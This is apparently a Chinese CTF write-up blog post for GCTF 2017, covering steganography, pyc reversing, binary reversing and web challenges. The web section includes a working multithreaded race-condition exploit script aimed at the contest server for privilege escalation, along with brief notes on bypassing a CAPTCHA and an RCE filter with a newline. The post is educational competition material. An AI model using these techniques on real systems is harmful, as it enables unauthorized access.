<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="Another independent blog written by a CTFer."><title>GCTF 2017 Write-up | Aspen Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.3.1/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
ga('create','UA-42440632-2','auto');ga('send','pageview');
</script></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">GCTF 2017 Write-up</h1><a id="logo" href="/.">Aspen Blog</a><p class="description">Memories &amp; Technologies</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">GCTF 2017 Write-up</h1><div class="post-meta">Jun 12, 2017<span> | </span><span class="category"><a href="/categories/writeup/">writeup</a></span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 1.4k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-hourglass-half"></i><span class="post-count"> 6</span><span class="post-meta-item-text"> 分钟</span></span></span></div><a class="disqus-comment-count" data-disqus-identifier="2017/06/12/gctf-2017-write-up/" href="/2017/06/12/gctf-2017-write-up/#disqus_thread"></a><div class="post-content"><p>总体来看gctf也算是最近难得的可玩性较高的CTF比赛了，虽然可能有的题目略偏简单，但是丰富程度还是值得称赞的。</p>
<p>但是官方的Write-up两天过去了也没有出，随手把当天做出来的题目先整理出来。</p>
<p><strong>更新</strong>：官方writeup居然直接放大佬们交的wp，有点狠</p>
<h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><h5 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h5><p>只有一张图片，很明显是图片隐写。掏出神器Stegsolve，可以发现是在左上角的黑色里面藏了一幅二维码。扫码出来是一段十六进制值，幻数03F30D可以判断是一段pyc代码，逆向之：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">    str = [<span class="number">65</span>,</span><br><span class="line">     <span class="number">108</span>,</span><br><span class="line">     <span class="number">112</span>,</span><br><span class="line">     <span class="number">104</span>,</span><br><span class="line">     <span class="number">97</span>,</span><br><span class="line">     <span class="number">76</span>,</span><br><span class="line">     <span class="number">97</span>,</span><br><span class="line">     <span class="number">98</span>]</span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        flag += chr(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<p>另存，在Python Prompt中import并调用之，得flag：AlphaLab</p>
<h5 id="test-pyc"><a href="#test-pyc" class="headerlink" title="test.pyc"></a>test.pyc</h5><p>同样得到一个pyc文件，不过该pyc文件的字节码被修改过，导致不能正常逆向出结果。（某<a href="http://tool.lu/pyc/" target="_blank" rel="noopener">在线反编译工具</a>可以不完全逆向出一部分代码）</p>
<p>查阅大量资料，尤其是<a href="http://tenshine.party/python/assembly-python.html" target="_blank" rel="noopener">出题人博客</a>(貌似已停止更新)后得知，python中字节码对应PyCodeObject对象，而pyc的实质是该对象的序列化。用marshal库手工反序列化，可以得到PyCodeObject对象本身。通过对象的co_const列表，可以得到源代码中定义的所有常量。</p>
<p><img src="/assets/images/gctf-testpyc.png" alt="PyCodeObject"></p>
<p>可以明显看到前7个常量应当是一个反序存储的base64值，解码后发现是反向的移位1位的flag值，移位得解。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"></span><br><span class="line">p = open(<span class="string">'test0.pyc'</span>, <span class="string">'r'</span>).read()[<span class="number">8</span>:] <span class="comment"># 注意前8位是时间和幻数</span></span><br><span class="line">co = marshal.loads(p)</span><br><span class="line">s = <span class="string">''</span>.join(co.co_consts[:<span class="number">7</span>])[::<span class="number">-1</span>]</span><br><span class="line">s = s.decode(<span class="string">'base64'</span>)[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">    ans += chr(ord(x) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> ans</span><br></pre></td></tr></table></figure>
<h5 id="ReverseMe"><a href="#ReverseMe" class="headerlink" title="ReverseMe"></a>ReverseMe</h5><p>本以为是逆向结果不是，把文件拖到最后可以很明显地看到FFD8FF，把文件反向之，得到一个flag的镜像（……），Photoshop处理后得到flag</p>
<h4 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h4><h5 id="HackMe"><a href="#HackMe" class="headerlink" title="HackMe"></a>HackMe</h5><p>一个ELF64文件，运行提示“Give me the password“。拖进IDA发现符号表被清空，通过提示字符串的引用来源找到入口点。逆向之：</p>
<p><img src="/assets/images/gctf-hackme.jpg" alt="IDA Pro Reverse Code"></p>
<p>整个算法比较简单，基本逻辑是将byte_6B4270对应的字符和生成的数字异或得flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">damnit</span><span class="params">(p)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> p &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1828812941</span> * damnit(p<span class="number">-1</span>) + <span class="number">12345</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">p = open(<span class="string">'input0'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">22</span>):</span><br><span class="line">    x = damnit(i)</span><br><span class="line">    ans += chr(ord(p[i]) ^ x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> ans</span><br></pre></td></tr></table></figure>
<h5 id="debug-exe"><a href="#debug-exe" class="headerlink" title="debug.exe"></a>debug.exe</h5><p>一个.NET 4.0可执行程序。逻辑也比较简单，实现之即可。</p>
<p>注意，IDA Pro虽可以逆向.NET Executable，但只能逆向为字节码。推荐使用诸如ILSpy等.NET逆向工具，方便分析。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">str0 = <span class="string">"CreateByTenshine"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primeconv</span><span class="params">(xortarget, index)</span>:</span></span><br><span class="line">    prime = (<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">103</span>,<span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>)</span><br><span class="line">    <span class="keyword">return</span> prime[index] ^ xortarget</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createflag</span><span class="params">(str)</span>:</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    tstr = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> str:</span><br><span class="line">        c = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">            c = chr(primeconv(ord(c), i))</span><br><span class="line">        tstr += c</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'flag&#123;'</span> + hashlib.md5(tstr).hexdigest().upper() + <span class="string">'&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> createflag(str0)</span><br></pre></td></tr></table></figure>
<h5 id="密码加密"><a href="#密码加密" class="headerlink" title="密码加密"></a>密码加密</h5><p>正在复盘。</p>
<h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h4><p>水平不够，来不及做……</p>
<h5 id="热身题"><a href="#热身题" class="headerlink" title="热身题"></a>热身题</h5><p>index.php —&gt; robots.txt —&gt; rob0t.php —&gt; flag</p>
<h5 id="变态验证码怎么破"><a href="#变态验证码怎么破" class="headerlink" title="变态验证码怎么破"></a>变态验证码怎么破</h5><p>验证码用过一次SESSION的验证码字段会被置空，所以只要不生成新的验证码，验证码就一直是空串</p>
<h5 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">""</span>, <span class="string">"gctf09"</span>);</span><br><span class="line"><span class="keyword">if</span> ($mysqli-&gt;connect_errno) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"数据库连接错误，多次出现请联系管理员。"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印源码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'showcode'</span>]))&#123;</span><br><span class="line">    highlight_file(___FILE___);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line"><span class="comment">// 初次访问生成用户</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">"name"</span>]))&#123;</span><br><span class="line">    $user=substr(md5(uniqid().uniqid()),<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line">    $_SESSION[<span class="string">"name"</span>]=$user;</span><br><span class="line">    $stmt = $mysqli-&gt;prepare(<span class="string">"INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"ss"</span>,$user,md5($user));</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;close();</span><br><span class="line">    $stmt = $mysqli-&gt;prepare(<span class="string">"INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"s"</span>,$user);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;close();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $user=$_SESSION[<span class="string">"name"</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重置时清理用户信息</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REQUEST_METHOD"</span>] === <span class="string">"POST"</span> &amp;&amp; $_GET[<span class="string">'method'</span>]===<span class="string">"reset"</span> &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) )&#123;</span><br><span class="line">    $stmt = $mysqli-&gt;prepare(<span class="string">"DELETE FROM gctf09.`user` where name=?"</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"s"</span>,$user);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt = $mysqli-&gt;prepare(<span class="string">"DELETE FROM gctf09.`priv` where name=?"</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"s"</span>,$user);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt = $mysqli-&gt;prepare(<span class="string">"INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"ss"</span>,$user,md5($_POST[<span class="string">'password'</span>]));</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;close();</span><br><span class="line">    <span class="comment">//判断用户权限时会查询priv表，如果为不为TRUE则是管理员权限</span></span><br><span class="line">    $stmt = $mysqli-&gt;prepare(<span class="string">"INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"</span>);</span><br><span class="line">    $stmt-&gt;bind_param(<span class="string">"s"</span>,$user);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    $stmt-&gt;close();</span><br><span class="line">    $mysqli-&gt;close();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"修改成功"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在重置用户的时候，用户表中的相应记录是先删除后添加，于是产生条件竞争，只要打好这个时间差就好。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Register Thread'</span>, i, <span class="string">' Start'</span></span><br><span class="line">    param = &#123;<span class="string">'method'</span>: <span class="string">'reset'</span>&#125;</span><br><span class="line">    payload = &#123;<span class="string">'name'</span>: <span class="string">'9ee1bb39dceeece1'</span>, <span class="string">'password'</span>: <span class="string">'as9en'</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">'PHPSESSID'</span>: <span class="string">'jk4f54scqb3uroubqi87tfoaq7'</span>&#125;</span><br><span class="line">    r = requests.post(<span class="string">'http://218.2.197.242:18009/'</span>, params = param, \</span><br><span class="line">        data = payload, cookies = cookies)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'GetFlag Thread'</span>, i, <span class="string">' Start'</span></span><br><span class="line">    param = &#123;<span class="string">'method'</span>: <span class="string">'login'</span>&#125;</span><br><span class="line">    payload = &#123;<span class="string">'name'</span>: <span class="string">'9ee1bb39dceeece1'</span>, <span class="string">'password'</span>: <span class="string">'as9en'</span>&#125;</span><br><span class="line">    cookies = &#123;<span class="string">'PHPSESSID'</span>: <span class="string">'jk4f54scqb3uroubqi87tfoaq7'</span>&#125;</span><br><span class="line">    r = requests.post(<span class="string">'http://218.2.197.242:18009/login.php'</span>, params = param, \</span><br><span class="line">        data = payload, cookies = cookies)</span><br><span class="line">    <span class="keyword">print</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        thread.start_new_thread(register, (i, ))</span><br><span class="line">        thread.start_new_thread(getflag, (i, ))</span><br><span class="line">        thread.start_new_thread(getflag, (i, ))</span><br><span class="line">        thread.start_new_thread(getflag, (i, ))</span><br><span class="line">        thread.start_new_thread(getflag, (i, ))</span><br><span class="line">        thread.start_new_thread(getflag, (i, ))</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>
<p>不要问我为啥那么多getflag……服务器太卡</p>
<h5 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="RCE绕过"></a>RCE绕过</h5><p>一个有简单过滤的RCE，用%0A换行符即可绕过。</p>
<h5 id="Java序列化"><a href="#Java序列化" class="headerlink" title="Java序列化"></a>Java序列化</h5><p>这题是复盘时候拿出来的，主要开头想法不对，一直在想办法反序列化相应对象。结果最后十六进制修改了id对应的值就拿到Flag了……QAQ</p>
</div><div class="tags"><a href="/tags/gctf/">gctf</a></div><div class="post-nav"><a class="pre" href="/2018/01/25/an-introduction-to-cs/">计算机科学知识体系系列 - 导论</a></div><div class="post-ad"><script src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-8173953423049587" data-ad-slot="3190220378" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div><div id="disqus_thread"><div class="btn_click_load"><button class="disqus_click_btn">阅读评论（请确保 Disqus 可以正常加载）</button></div><script type="text/javascript">var disqus_config = function () {
    this.page.url = 'https://lpnal.me/2017/06/12/gctf-2017-write-up/';
    this.page.identifier = '2017/06/12/gctf-2017-write-up/';
    this.page.title = 'GCTF 2017 Write-up';
  };</script><script type="text/javascript" id="disqus-lazy-load-script">$.ajax({
url: 'https://disqus.com/next/config.json',
timeout: 2500,
type: 'GET',
success: function(){
  var d = document;
  var s = d.createElement('script');
  s.src = '//blog-lpnal.disqus.com/embed.js';
  s.setAttribute('data-timestamp', + new Date());
  (d.head || d.body).appendChild(s);
  $('.disqus_click_btn').css('display', 'none');
},
error: function() {
  $('.disqus_click_btn').css('display', 'block');
}
});</script><script type="text/javascript" id="disqus-click-load">$('.btn_click_load').click(() => {  //click to load comments
    (() => { // DON'T EDIT BELOW THIS LINE
        var d = document;
        var s = d.createElement('script');
        s.src = '//blog-lpnal.disqus.com/embed.js';
        s.setAttribute('data-timestamp', + new Date());
        (d.head || d.body).appendChild(s);
    })();
    $('.disqus_click_btn').css('display','none');
});</script><script type="text/javascript" id="disqus-count-script">$(function() {
     var xhr = new XMLHttpRequest();
     xhr.open('GET', '//disqus.com/next/config.json', true);
     xhr.timeout = 2500;
     xhr.onreadystatechange = function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         $('.post-meta .post-comments-count').show();
         var s = document.createElement('script');
         s.id = 'dsq-count-scr';
         s.src = 'https://blog-lpnal.disqus.com/count.js';
         s.async = true;
         (document.head || document.body).appendChild(s);
       }
     };
     xhr.ontimeout = function () { xhr.abort(); };
     xhr.send(null);
   });
</script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://lpnal.me"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/blog/">blog</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/cs/">cs</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/writeup/">writeup</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/gctf/" style="font-size: 15px;">gctf</a> <a href="/tags/eail/" style="font-size: 15px;">eail</a> <a href="/tags/ciscn/" style="font-size: 15px;">ciscn</a> <a href="/tags/timezone/" style="font-size: 15px;">timezone</a> <a href="/tags/virtualenv/" style="font-size: 15px;">virtualenv</a> <a href="/tags/vscode/" style="font-size: 15px;">vscode</a> <a href="/tags/git/" style="font-size: 15px;">git</a> <a href="/tags/travis/" style="font-size: 15px;">travis</a> <a href="/tags/csrg/" style="font-size: 15px;">csrg</a> <a href="/tags/hexo/" style="font-size: 15px;">hexo</a> <a href="/tags/jekyll/" style="font-size: 15px;">jekyll</a> <a href="/tags/suctf/" style="font-size: 15px;">suctf</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/04/24/ciscn-2019-writeup/">2019 ciscn writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/noip-2017-puji/">某测试程序阅读题详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/23/git-submodule/">Git 子模块</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/14/porting-to-hexo/">从 GitHub Pages 迁移到 Hexo：Hexo + Travis CI + VPS + GPages，双镜像站点侧记</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/13/venvwrapper-and-vscode/">virtualenvwrapper 配合 Visual Studio Code 使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/12/linux-timezone-setting/">调整 Linux 时区设置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/suctf-writeup/">SUCTF 2018 Write-up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/27/ciscn-prelim-wp/">CISCN 2018 初赛 Write-up</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/25/an-introduction-to-cs/">计算机科学知识体系系列 - 导论</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/12/gctf-2017-write-up/">GCTF 2017 Write-up</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-comment-o"> 最近评论</i></div><script type="text/javascript" src="//blog-lpnal.disqus.com/recent_comments_widget.js?num_items=5&amp;hide_avatars=1&amp;avatar_size=32&amp;excerpt_length=20&amp;hide_mods=1"></script></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://ctf.lpnal.top/" title="ForestCTF" target="_blank">ForestCTF</a></div><div class="widget"><script src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async="async"></script><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-8173953423049587" data-ad-slot="4758934440" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">Aspen Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a><br><a rel="nofollow" target="_blank" href="http://www.miitbeian.gov.cn">苏ICP备17036487号-1</a> |
 <img class="nofancybox" src="/img/beian.png" style="margin-bottom: -4px;"><a rel="nofollow" target="_blank" href="http://www.beian.gov.cn">苏公网安备 32011302320688号</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.2/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>